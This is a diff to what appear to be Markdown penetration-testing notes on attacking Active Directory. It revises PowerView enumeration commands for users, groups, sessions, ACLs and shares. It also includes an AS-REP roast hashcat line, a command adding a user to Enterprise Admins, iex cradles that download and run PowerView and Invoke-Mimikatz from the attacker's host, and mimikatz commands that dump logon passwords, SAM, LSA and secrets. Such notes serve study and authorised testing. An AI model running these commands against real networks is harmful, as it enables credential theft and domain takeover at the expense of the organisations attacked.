@@ -17,6 +17,8 @@ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 
 With valid credentials for a domain user, we can first enumerate the domain remotely with [PowerView.py](https://github.com/aniqfakhrul/powerview.py)
 
+**Note:** This can miss custome attributes compared to running PowerView locally
+
 ```bash
 # Connect
 powerview --dc-ip $IP $DOMAIN/$USER:$PASS@$IP
@@ -27,35 +29,31 @@ Get-NetDomain
 
 # Enumerate user objects
 Get-NetUser -Select samaccountname
-Get-NetUser -Properties samaccountname,description,memberof
+Get-NetUser -Properties samaccountname,description,memberof -TableView
 Get-NetUser $USER
+Get-NetGroup -Where 'member contains $USER' -Select cn
 
 # Enumerate group objects
-Get-NetGroup -Properties cn,member
+Get-NetGroup -Properties cn,member -TableView
 Get-NetGroup $GROUP
-Get-NetGroup -UserName 
 
 # Enumerate Computer objects
-Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+Get-NetComputer -Properties dnshostname,operatingsystem,operatingsystemversion -TableView
 
-# Find hosts on the local domain where the current user has local administrator access
+# Check for logged-in users (DOES NOT WORK CURRENTLY, RUN LOCALLY)
+Get-NetSession -Computer $COMPUTER
+
+# Find hosts on the local domain where the current user has local administrator access (DOES NOT WORK CURRENTLY, RUN LOCALLY)
 Find-LocalAdminAccess
 
-# Check for logged-in users
-Get-NetSession -ComputerName $COMPUTER
-
 # Enumerate SPNs linked to users
-Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-NetUser -SPN -Properties samaccountname,serviceprincipalname -TableView
 
-# Retrieve the ACL for the specified object
-Get-ObjectAcl -Identity $OBJECT | select SecurityIdentifier,ActiveDirectoryRights
-Convert-SidToName $SID
-"$SID","$SID" | Convert-SidToName
+# Retrieve the ACL for the specified object (DOES NOT WORK CURRENTLY, RUN LOCALLY)
+Get-ObjectAcl -Identity $OBJECT -Select SecurityIdentifier,ActiveDirectoryRights -TableView
+Get-ObjectAcl -Identity $OBJECT -Where 'ActiveDirectoryRights eq GenericAll' -Select SecurityIdentifier,ActiveDirectoryRights -TableView
 
-# Check if any users have "GenericAll" over a specified object
-Get-ObjectAcl -Identity $OBJECT | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
-
-# Enumerate domain shares
+# Enumerate domain shares (DOES NOT EXIST CURRENTLY, RUN LOCALLY)
 Find-DomainShare
 Find-DomainShare -CheckShareAccess # Takes a long time
 ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
@@ -75,33 +73,31 @@ iex(new-object net.webclient).downloadstring("http://$OUR_IP/PowerView.ps1")
 Get-NetDomain
 
 # Enumerate user objects
-Get-NetUser | select samaccountname, name, displayname, userprincipalname, distinguishedname, objectsid, objectguid, memberof, lastlogon, pwdlastset, badpwdcount, badpasswordtime, useraccountcontrol
+Get-NetUser | select samaccountname,description,memberof
 Get-NetUser $USER
 
 # Enumerate group objects
-Get-NetGroup | select cn, member
-Get-NetGroup $GROUP | select cn, member
+Get-NetGroup | select cn,member
+Get-NetGroup $GROUP | select cn,member
 Get-NetGroup -UserName $USER | select cn
 
 # Enumerate Computer objects
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 
+# Check for logged-in users
+Get-NetSession -Computer $COMPUTER
+
 # Find hosts on the local domain where the current user has local administrator access
 Find-LocalAdminAccess
-
-# Check for logged-in users
-Get-NetSession -ComputerName $COMPUTER
 
 # Enumerate SPNs linked to users
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
-# Retrieve the ACL for the specified object
+# Retrieve the ACLs for the specified object
 Get-ObjectAcl -Identity $OBJECT | select SecurityIdentifier,ActiveDirectoryRights
-Convert-SidToName $SID
-"$SID","$SID" | Convert-SidToName
-
-# Check if any users have "GenericAll" over a specified object
+ConvertFrom-SID $SID
 Get-ObjectAcl -Identity $OBJECT | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"$SID","$SID" | ConvertFrom-SID
 
 # Enumerate domain shares
 Find-DomainShare
@@ -134,18 +130,19 @@ net group "Enterprise Admins" mojo /add /domain
 [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
 
 ```bash
-# mimikatz.exe
+# Invoke mimikatz
 .\mimikatz.exe
+iex(new-object net.webclient).downloadstring("http://$OUR_IP/Invoke-Mimikatz.ps1")
+
 privilege::debug
 token::elevate
 log
 sekurlsa::logonpasswords
 lsadump::sam
+lsadump::lsa /patch
 lsadump::secrets
 token::revert
 exit
-
-# 
 ```
 
 **[gpp-decrypt](0%20Tools/gpp-decrypt.md)**
